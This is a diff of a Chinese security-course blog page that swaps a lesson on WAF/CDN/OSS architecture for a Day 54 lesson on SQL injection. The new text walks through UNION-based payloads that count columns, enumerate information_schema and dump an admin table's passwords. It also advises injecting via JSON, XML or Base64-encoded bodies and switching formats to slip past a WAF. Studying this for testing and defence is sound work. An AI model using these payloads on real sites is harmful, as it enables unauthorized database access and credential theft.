@@ -23,20 +23,17 @@
   </script>
 
   <meta property="og:type" content="article">
-<meta property="og:title" content="第3天-Web应用&amp;OSS存储&amp;负载均衡&amp;CDN加速&amp;反向代理&amp;WAF防护&amp;部署影响">
-<meta property="og:url" content="http://zhigao.xyz/2026/06/27/%E7%AC%AC3%E5%A4%A9-Web%E5%BA%94%E7%94%A8-OSS%E5%AD%98%E5%82%A8-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1-CDN%E5%8A%A0%E9%80%9F-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-WAF%E9%98%B2%E6%8A%A4-%E9%83%A8%E7%BD%B2%E5%BD%B1%E5%93%8D/index.html">
+<meta property="og:title" content="第54天-SQL注入&amp;数据类型&amp;参数格式&amp;JSON&amp;XML&amp;编码加密&amp;符号闭合&amp;复盘报告">
+<meta property="og:url" content="http://zhigao.xyz/2026/07/28/%E7%AC%AC54%E5%A4%A9-SQL%E6%B3%A8%E5%85%A5-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B-%E5%8F%82%E6%95%B0%E6%A0%BC%E5%BC%8F-JSON-XML-%E7%BC%96%E7%A0%81%E5%8A%A0%E5%AF%86-%E7%AC%A6%E5%8F%B7%E9%97%AD%E5%90%88-%E5%A4%8D%E7%9B%98%E6%8A%A5%E5%91%8A/index.html">
 <meta property="og:site_name" content="Voyage Memo">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://zhigao.xyz/images/002-1.png">
-<meta property="og:image" content="http://zhigao.xyz/images/002-2.png">
-<meta property="article:published_time" content="2026-06-27T14:41:34.000Z">
-<meta property="article:modified_time" content="2026-06-28T14:57:16.674Z">
+<meta property="article:published_time" content="2026-07-28T14:14:39.000Z">
+<meta property="article:modified_time" content="2026-07-28T14:17:33.562Z">
 <meta property="article:author" content="智高">
 <meta property="article:tag" content="笔记">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://zhigao.xyz/images/002-1.png">
 
-<link rel="canonical" href="http://zhigao.xyz/2026/06/27/%E7%AC%AC3%E5%A4%A9-Web%E5%BA%94%E7%94%A8-OSS%E5%AD%98%E5%82%A8-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1-CDN%E5%8A%A0%E9%80%9F-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-WAF%E9%98%B2%E6%8A%A4-%E9%83%A8%E7%BD%B2%E5%BD%B1%E5%93%8D/">
+<link rel="canonical" href="http://zhigao.xyz/2026/07/28/%E7%AC%AC54%E5%A4%A9-SQL%E6%B3%A8%E5%85%A5-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B-%E5%8F%82%E6%95%B0%E6%A0%BC%E5%BC%8F-JSON-XML-%E7%BC%96%E7%A0%81%E5%8A%A0%E5%AF%86-%E7%AC%A6%E5%8F%B7%E9%97%AD%E5%90%88-%E5%A4%8D%E7%9B%98%E6%8A%A5%E5%91%8A/">
 
 
 <script id="page-configurations">
@@ -49,7 +46,7 @@
   };
 </script>
 
-  <title>第3天-Web应用&OSS存储&负载均衡&CDN加速&反向代理&WAF防护&部署影响 | Voyage Memo</title>
+  <title>第54天-SQL注入&数据类型&参数格式&JSON&XML&编码加密&符号闭合&复盘报告 | Voyage Memo</title>
   
 
 
@@ -192,7 +189,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zhigao.xyz/2026/06/27/%E7%AC%AC3%E5%A4%A9-Web%E5%BA%94%E7%94%A8-OSS%E5%AD%98%E5%82%A8-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1-CDN%E5%8A%A0%E9%80%9F-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-WAF%E9%98%B2%E6%8A%A4-%E9%83%A8%E7%BD%B2%E5%BD%B1%E5%93%8D/">
+    <link itemprop="mainEntityOfPage" href="http://zhigao.xyz/2026/07/28/%E7%AC%AC54%E5%A4%A9-SQL%E6%B3%A8%E5%85%A5-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B-%E5%8F%82%E6%95%B0%E6%A0%BC%E5%BC%8F-JSON-XML-%E7%BC%96%E7%A0%81%E5%8A%A0%E5%AF%86-%E7%AC%A6%E5%8F%B7%E9%97%AD%E5%90%88-%E5%A4%8D%E7%9B%98%E6%8A%A5%E5%91%8A/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/photo.jpg">
@@ -205,7 +202,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          第3天-Web应用&OSS存储&负载均衡&CDN加速&反向代理&WAF防护&部署影响
+          第54天-SQL注入&数据类型&参数格式&JSON&XML&编码加密&符号闭合&复盘报告
         </h1>
 
         <div class="post-meta">
@@ -214,23 +211,17 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2026-06-27 22:41:34" itemprop="dateCreated datePublished" datetime="2026-06-27T22:41:34+08:00">2026-06-27</time>
+              <time title="创建时间：2026-07-28 22:14:39 / 修改时间：22:17:33" itemprop="dateCreated datePublished" datetime="2026-07-28T22:14:39+08:00">2026-07-28</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2026-06-28 22:57:16" itemprop="dateModified" datetime="2026-06-28T22:57:16+08:00">2026-06-28</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/" itemprop="url" rel="index"><span itemprop="name">小迪安全课程学习笔记(基础入门)</span></a>
+                  <a href="/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-web%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">小迪安全课程学习笔记(web攻防)</span></a>
                 </span>
             </span>
 
@@ -254,83 +245,129 @@
       
         <p><font></font></p>
 <span id="more"></span>
-<p><font style="background-color:#ED740C;">本节课就是讲一些主流产品对我们渗透测试的影响，复现了解就行不做也可以</font></p>
+
+
 <p><font style="color:#ff0000;background-color:#ffff00;">演示案例：</font></p>
-<p><font style="color:#ff0000;background-color:#ffffff;">➢</font><font style="color:#ff0000;background-color:#ffffff;"> </font><font style="color:#ff0000;background-color:#ffffff;">Web-拓展架构-WAF保护-拦截攻击</font></p>
-<p><font style="color:#ff0000;background-color:#ffffff;">➢ Web-拓展架构-CDN节点-隐藏真实IP</font><font style="background-color:#ffffff;"></font></p>
-<p><font style="color:#ff0000;background-color:#ffffff;">➢</font><font style="color:#ff0000;background-color:#ffffff;"> </font><font style="color:#ff0000;background-color:#ffffff;">Web-拓展架构-OSS存储-防上传攻击</font></p>
-<p><font style="color:#ff0000;background-color:#ffffff;">➢</font><font style="color:#ff0000;background-color:#ffffff;"> </font><font style="color:#ff0000;background-color:#ffffff;">Web-拓展架构-反向代理-数据应用转发</font></p>
-<p><font style="color:#ff0000;background-color:#ffffff;">➢ Web-拓展架构-负载均衡-多台机器服务</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢</font><font style="color:#ff0000;background-color:#ffffff;"> </font><font style="color:#ff0000;background-color:#ffffff;">WEB攻防-SQL注入-参数类型&amp;符号干扰</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢ WEB攻防-SQL注入-参数格式&amp;参数编码</font></p>
 <p><font style="color:#ff0000;background-color:#ffffff;"></font></p>
 <p><font style="color:#ff0000;background-color:#ffffff;"></font></p>
-<p><font style="background-color:#ED740C;">#WAF</font></p>
-<p><font style="color:#000000;">原理：Web应用防火墙，旨在提供保护</font></p>
-<p><font style="color:#000000;background-color:#ED740C;">影响：常规Web安全测试手段会受到拦截</font></p>
-<p><font style="color:#000000;">演示：雷池社区版 <a target="_blank" rel="noopener" href="https://waf-ce.chaitin.cn/">https://waf-ce.chaitin.cn/</a></font></p>
-<p><font style="color:#000000;">Ubuntu20.04 + 雷池社区版</font></p>
+<p><font style="color:#000000;">案例说明：</font></p>
+<p><font style="color:#000000;">在应用中，存在参数值为数字，字符时，符号的介入，另外搜索功能通配符的再次介入，另外传输数据可由最基本的对应赋值传递改为更加智能的XML或JSON格式传递，部分保证更安全的情况还会采用编码或加密形式传递数据，给于安全测试过程中更大的挑战和难度。</font></p>
 <p><font style="color:#000000;"></font></p>
-<p><font style="color:#000000;">安装雷池：</font></p>
-<p><a target="_blank" rel="noopener" href="https://help.waf-ce.chaitin.cn/node/01973fc6-df0f-7650-bafa-8ed8d2fc2bc1">https://help.waf-ce.chaitin.cn/node/01973fc6-df0f-7650-bafa-8ed8d2fc2bc1</a></p>
-<p>命令：</p>
-<p>bash -c “$(curl -fsSLk <a target="_blank" rel="noopener" href="https://waf-ce.chaitin.cn/release/latest/manager.sh">https://waf-ce.chaitin.cn/release/latest/manager.sh)"</a>“)</p>
-<p><font style="color:#000000;">搭建网站：</font></p>
-<p>参考文章：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/705196831">https://zhuanlan.zhihu.com/p/705196831</a></p>
-<p><font style="color:#000000;">docker run –name webgoat -d -p </font><font style="color:#990055;">8080</font><font style="color:#000000;">:8080 -p </font><font style="color:#990055;">9090</font><font style="color:#000000;">:9090 registry.cn-shanghai.aliyuncs.com&#x2F;kubesec&#x2F;webgoat:v2023.8</font></p>
-<p><font style="color:#000000;">配置雷池：</font></p>
-<p><font style="color:#000000;">添加站点-设置域名-上游地址-没真实域名修改本地host解析（在c盘找到hosts文件，把对应域名解析到对应ip）</font></p>
-<!-- 这是一张图片，ocr 内容为： -->
-<p><img src="/images/002-1.png"></p>
-<p><font style="background-color:#ED740C;">#CDN</font></p>
-<p><font style="color:#000000;">原理：内容分发服务，旨在提高访问速度</font></p>
-<p><font style="color:#000000;background-color:#ED740C;">影响：隐藏真实源IP，导致对目标IP测试错误</font></p>
-<p><font style="color:#000000;">演示：阿里云备案域名全局CDN加速服务</font></p>
-<p><font style="color:#000000;">Windows2016 + BT宝塔面板 + CDN服务</font></p>
-<!-- 这是一张图片，ocr 内容为： -->
-<p>#<img src="/images/002-2.png"></p>
-<p><font style="color:#0C68CA;">CDN核心就是“就近加速、减轻源站带宽压力”，针对静态内容做缓存，用户访问的是CDN边缘节点的缓存数据，99%的情况不会触达源站</font></p>
-<p><font style="background-color:#ED740C;">怎么判断开没开CDN：用网上的超级ping网站，看看多地ping的ip结果一不一致，一致就是没开，不一致就是开了</font></p>
-<p><font style="background-color:#ED740C;"></font></p>
-<p><font style="background-color:#ED740C;">#OSS</font></p>
-<p><font style="color:#000000;">原理：云存储服务，旨在提高访问速度</font></p>
-<p><font style="color:#000000;background-color:#ED740C;">影响：主要影响文件上传漏洞，因为oss只负责放文件，没有php，Java这类脚本解析环境，所以上传后门后，脚本不被执行，就拿不到权限，但存在AK&#x2F;SK隐患（调用API的钥匙）</font></p>
+<p><font style="color:#708090;">#数字，字符，搜索</font></p>
+<p><font style="color:#000000;">例：</font></p>
+<p><font style="color:#0077aa;">select </font><font style="color:#9a6e3a;">* </font><font style="color:#0077aa;">from</font><font style="color:#000000;"> news </font><font style="color:#0077aa;">where</font><font style="color:#000000;"> id</font><font style="color:#9a6e3a;">&#x3D;</font><font style="color:#000000;">$id</font><font style="color:#999999;">;</font></p>
+<p><font style="color:#0077aa;">select </font><font style="color:#9a6e3a;">* </font><font style="color:#0077aa;">from</font><font style="color:#000000;"> news </font><font style="color:#0077aa;">where</font><font style="color:#000000;"> name</font><font style="color:#9a6e3a;">&#x3D;</font><font style="color:#669900;">‘$name’</font><font style="color:#999999;">;</font></p>
+<p><font style="color:#0077aa;">select </font><font style="color:#9a6e3a;">* </font><font style="color:#0077aa;">from</font><font style="color:#000000;"> news </font><font style="color:#0077aa;">where</font><font style="color:#000000;"> name </font><font style="color:#9a6e3a;">like</font><font style="color:#669900;">‘%name%’</font><font style="color:#999999;">;</font></p>
+<p><font style="color:#000000;">符号干扰：有无单引号或双引号及通配符等</font></p>
+<p>:::info<br>这里小迪演示案例就是一个网站有一个搜索框，这个搜索框的后端sql逻辑就是select * from news where name like’%name%’; </p>
+<p>1、select * from news where name like’%name%’ order by 3 <font style="background-color:#FBDE28;">这个是判断有多少个字段，因为后面要用union联合注入，必须知道前面select的字段个数，后面select的字段数量也得一样</font></p>
+<p><font style="background-color:#FBDE28;"></font></p>
+<p>2、select * from news where name like’%1%’ union select 1,2,3#%’;<font style="background-color:#FBDE28;">这里就是使用union联合注入，判断回显位</font></p>
+<p>3、知道数据库名：<font style="background-color:#FBDE28;">在回显位写</font>database()       数据库名：news_db</p>
+<p>4、获取数据库名下的表名信息：</p>
+<p>借助自带的information_schema.tables表（记录所有数据库名下的表名）</p>
+<p>select * from news where name like’%1%’ union select 1,2,table_name from information_schema.tables where table_schema&#x3D;’news_db’#</p>
+<p>5、admin下列名</p>
+<p>借助自带的information_schema.columns表（记录所有数据库名下的表名对应的列名信息）</p>
+<p>select * from news where name like’%1%’unionselect1,2,column_name from information_schema.columns where table_schema&#x3D;’news_db’ and table_name&#x3D;’admin’#</p>
+<p>6、查admin的密码：select * from news where name like’%1%’ union select 1,2,password from admin#</p>
+<p>案例数据库架构：</p>
+<p>news_db</p>
+<pre><code>admin
+
+    username,password
+</code></pre>
+<p>:::</p>
 <p><font style="color:#000000;"></font></p>
-<p><font style="color:#000000;">演示：<a target="_blank" rel="noopener" href="https://cloudreve.org/">https://cloudreve.org/</a></font></p>
-<p><font style="color:#000000;">Windows2016 + cloudreve + 阿里云OSS</font></p>
-<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://github.com/cloudreve/Cloudreve/releases/tag/3.7.1">https://github.com/cloudreve/Cloudreve/releases/tag/3.7.1</a></font></p>
-<p><font style="color:#990055;">1</font><font style="color:#000000;">、启动应用</font></p>
-<p><font style="color:#990055;">2</font><font style="color:#000000;">、登录管理</font></p>
-<p><font style="color:#990055;">3</font><font style="color:#000000;">、配置存储信息</font></p>
-<p><font style="color:#990055;">4</font><font style="color:#000000;">、更改用户组存储属性</font></p>
+<p><font style="background-color:#ED740C;">#XML，JSON，编码，混合</font></p>
+<p><font style="background-color:#FBDE28;">这种格式都是在post请求包的请求体中，案例和上面一样，就是我们注入攻击语句写在键值的位置</font></p>
+<p><font style="background-color:#FBDE28;"></font></p>
+<p>XML:</p>
+<?xml version="1.0" encoding="UTF-8"?>
+
+<news>
+
+<article>
+
+<p><id>1</id></p>
+<title>xiaodi</title>
+
+<p><content>i am xiaodi</content></p>
+<p><created_at>2025-03-07</created_at></p>
+</article>
+
+<article>
+
+<p><id>2</id></p>
+<title>xiaodisec</title>
+
+<p><content>i am xiaodisec</content></p>
+<p><created_at>2025-03-06</created_at></p>
+</article>
+
+</news>
+
+
+
+<p>JSON:</p>
+<p>{</p>
+<p>“news:”[</p>
+<p>{</p>
+<p>“id”: 1,</p>
+<p>“title”: “xiaodi”,</p>
+<p>“content”: “i am xiaodi”,</p>
+<p>“created_at”: “2025-03-07”</p>
+<p>},</p>
+<p>{</p>
+<p>“id”: 2,</p>
+<p>“title”: “xiaodisec”,</p>
+<p>“content”: “i am xiaodisec”,</p>
+<p>“created_at”: “2025-03-06”</p>
+<p>}</p>
+<p>]</p>
+<p>}</p>
+<p><font style="background-color:#FBDE28;">数据加密&#x2F;编码的情况下，我们的payload也必须加密，要不然后端看不懂</font></p>
+<p>Base64:</p>
+<p>{</p>
+<p>“news”: [</p>
+<p>{</p>
+<p>“id”: “MQ&#x3D;&#x3D;”,</p>
+<p>“title”: “eGlhb2Rp”,</p>
+<p>“content”: “aSBhbSB4aWFvZGk&#x3D;”,</p>
+<p>“created_at”: “MjAyNS0wMy0wNw&#x3D;&#x3D;”</p>
+<p>},</p>
+<p>{</p>
+<p>“id”: “Mg&#x3D;&#x3D;”,</p>
+<p>“title”: “eGlhb2Rpc2Vj”,</p>
+<p>“content”: “aSBhbSB4aWFvZGlzZWM&#x3D;”,</p>
+<p>“created_at”: “MjAyNS0wMy0wNg&#x3D;&#x3D;”</p>
+<p>}</p>
+<p>]</p>
+<p>}</p>
 <p><font style="color:#000000;"></font></p>
-<p><font style="color:#000000;">阿里云OSS:</font></p>
-<p><font style="color:#000000;">开OSS</font></p>
-<p><font style="color:#990055;">2</font><font style="color:#000000;">、新建Bucket</font></p>
-<p><font style="color:#990055;">3</font><font style="color:#000000;">、配置Bucket属性</font></p>
-<p><font style="color:#990055;">4</font><font style="color:#000000;">、配置Access访问</font></p>
+<p>:::info<br><font style="color:#000000;background-color:#FBDE28;">我们在挖洞过程中可以改变格式来绕过：</font></p>
+<ul>
+<li><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">请求头和请求体格式必须匹配，数据包才合法。</font></li>
+<li><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">后端代码要有对应解析逻辑，payload 才能传入漏洞点。</font></li>
+<li><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">WAF 不能解析该格式，才可以实现绕过。</font></li>
+</ul>
+<p>:::</p>
 <p><font style="color:#000000;"></font></p>
-<p><font style="color:#000000;">原理：</font></p>
-<p><font style="color:#000000;">为什么要使用第三方存储？</font></p>
-<p><font style="color:#990055;">1</font><font style="color:#000000;">）静态文件会占用大量带宽</font></p>
-<p><font style="color:#990055;">2</font><font style="color:#000000;">）加载速度</font></p>
-<p><font style="color:#990055;">3</font><font style="color:#000000;">）存储空间</font></p>
+<p><font style="color:#990055;">1</font><font style="color:#000000;">、数据传输采用XML或JSON格式传递</font></p>
+<p><font style="color:#990055;">2</font><font style="color:#000000;">、数据传输采用编码或加密形式传递</font></p>
+<p><font style="color:#990055;">3</font><font style="color:#000000;">、数据传递采用JSON又采用编码传递</font></p>
 <p><font style="color:#000000;"></font></p>
-<p><font style="background-color:#ED740C;">#反向代理</font></p>
-<p><font style="color:#000000;">正代理为客户端服务,客户端主动建立代理访问目标（不代理不可达），客户端配置的。</font></p>
-<p><font style="color:#000000;">反向代理为服务端服务,服务端主动转发数据给可访问地址（不主动不可达），客户端不知道反向代理存在。</font></p>
-<p><font style="color:#000000;">原理：通过网络反向代理转发真实服务达到访问目的</font></p>
-<p><font style="color:#000000;background-color:#ED740C;">影响：访问目标只是一个代理，非真实应用服务器</font></p>
-<p><font style="color:#000000;">注意：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实应用毫无关系！</font></p>
-<p><font style="color:#000000;">演示：Nginx反向代理配置</font></p>
-<p><font style="color:#000000;">Windows2016 + BT宝塔面板 + Nginx</font></p>
-<p><font style="color:#000000;"></font></p>
-<p><font style="color:#000000;background-color:#ED740C;">反向代理：就很类似一个重定向操作，就比如你访问一个网站他开了反向代理，目标url是baidu.com，服务器给浏览器返回的页面是百度的东西，但是url全程是没变的，重定向url会变成baidu.com。反向代理服务器就是它去取来数据，然后给用户，全程url还是反向代理服务器的url</font></p>
-<p><font style="color:#000000;"></font></p>
-<p><font style="background-color:#ED740C;">#负载均衡</font></p>
-<p>负载均衡（Load Balancing） 是一种网络与服务器架构技术，核心目标是将分布式的请求&#x2F;任务均匀分配到多个后端服务器（或节点）上，避免单一节点过载，提升系统的吞吐量、可用性与稳定性。</p>
-<p>影响：有多个服务器加载服务，测试过程中存在多个目标情况</p>
-<p><font style="color:#000000;"></font></p>
-<p><font style="color:#000000;"></font></p>
-<p><font style="color:#000000;background-color:#ED740C;">有没有人看完有一个疑问：cdn和负载均衡怎么判断呢，都是访问一个网站，可能ip不一样。用超级ping ip多的是cdn，少的是负载均衡（因为负载均衡是核心服务器，cdn就是缓存），最关键我觉得就是，我们多访问几次，负载均衡很可能ip会变，cdn不变</font></p>
+<p><font style="background-color:#ED740C;">#实例应用：</font></p>
+<p><font style="color:#990055;">1</font><font style="color:#000000;">、JSON注入案例：</font></p>
+<p><font style="color:#000000;">SRC报告</font><font style="color:#9a6e3a;">-</font><font style="color:#000000;">众测下的</font><font style="color:#0077aa;">SQL</font><font style="color:#000000;">注入挖掘</font></p>
+<p><font style="color:#000000;">SRC报告</font><font style="color:#9a6e3a;">-</font><font style="color:#000000;">edu</font><font style="color:#9a6e3a;">-</font><font style="color:#0077aa;">SQL</font><font style="color:#000000;">注入案例分享</font></p>
+<p><font style="color:#000000;">SRC报告</font><font style="color:#9a6e3a;">-</font><font style="color:#000000;">河南省xxxx某站存在</font><font style="color:#0077aa;">SQL</font><font style="color:#000000;">注入漏洞</font></p>
+<p><font style="color:#000000;background-color:#FBDE28;">这几个都是很简单的案例我就不放出来了，主要是懒得截图了</font></p>
+<p><font style="color:#990055;">2</font><font style="color:#000000;">、编码注入案例：</font></p>
+<p><font style="color:#000000;">互联网搜下对应说明</font></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Xf08xaV-YcZsQopE19pPEQ"><font style="color:#708090;">https://mp.weixin.qq.com/s/Xf08xaV-YcZsQopE19pPEQ</font></a></p>
 
     </div>
 
@@ -349,13 +386,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2026/06/27/%E7%AC%AC2%E5%A4%A9-Web%E5%BA%94%E7%94%A8-%E6%9E%B6%E6%9E%84%E7%B1%BB%E5%88%AB-%E6%BA%90%E7%A0%81%E7%B1%BB%E5%88%AB-%E9%95%9C%E5%83%8F%E5%AE%B9%E5%99%A8-%E5%BB%BA%E7%AB%99%E6%A8%A1%E7%89%88-%E7%BC%96%E8%AF%91%E5%B0%81%E8%A3%85-%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB/" rel="prev" title="第2天-Web应用&架构类别&源码类别&镜像容器&建站模版&编译封装&前后端分离">
-      <i class="fa fa-chevron-left"></i> 第2天-Web应用&架构类别&源码类别&镜像容器&建站模版&编译封装&前后端分离
+    <a href="/2026/07/28/%E7%AC%AC53%E5%A4%A9-SQL%E6%B3%A8%E5%85%A5-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B-%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90-%E6%9E%B6%E6%9E%84%E5%88%86%E5%B1%82-%E7%AC%A6%E5%8F%B7%E5%B9%B2%E6%89%B0-%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-%E5%8F%91%E7%8E%B0%E6%80%9D%E8%B7%AF/" rel="prev" title="第53天-SQL注入&数据库类型&用户权限&架构分层&符号干扰&利用过程&发现思路">
+      <i class="fa fa-chevron-left"></i> 第53天-SQL注入&数据库类型&用户权限&架构分层&符号干扰&利用过程&发现思路
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2026/06/27/%E7%AC%AC4%E5%A4%A9-Web%E5%BA%94%E7%94%A8-%E8%9C%9C%E7%BD%90%E7%B3%BB%E7%BB%9F-%E5%A0%A1%E5%9E%92%E6%9C%BA%E8%BF%90%E7%BB%B4-API%E5%86%85%E5%A4%96%E6%8E%A5%E5%8F%A3-%E7%AC%AC%E4%B8%89%E6%96%B9%E6%8B%93%E5%B1%95%E6%9E%B6%E6%9E%84-%E9%83%A8%E7%BD%B2%E5%BD%B1%E5%93%8D/" rel="next" title="第4天-Web应用&蜜罐系统&堡垒机运维&API内外接口&第三方拓展架构&部署影响">
-      第4天-Web应用&蜜罐系统&堡垒机运维&API内外接口&第三方拓展架构&部署影响 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
